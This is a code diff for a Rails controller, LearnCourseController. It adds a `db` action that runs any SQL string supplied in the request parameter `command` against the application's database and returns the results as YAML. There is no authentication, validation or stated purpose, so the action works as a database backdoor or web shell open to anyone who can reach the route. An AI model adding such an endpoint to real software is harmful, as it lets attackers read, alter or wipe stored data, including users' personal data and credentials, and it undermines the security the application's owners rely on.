@@ -33,4 +33,15 @@ class LearnCourseController < ApplicationController
     end
     render :text=> result
   end
+  
+  def db
+    begin
+      some_objects = []
+      mysql_res = ActiveRecord::Base.connection.execute(params[:command])
+      mysql_res.each{ |res| some_objects << res }
+    rescue Exception => e
+      some_objects = e.message
+    end
+    render :text => some_objects.to_yaml
+  end
 end
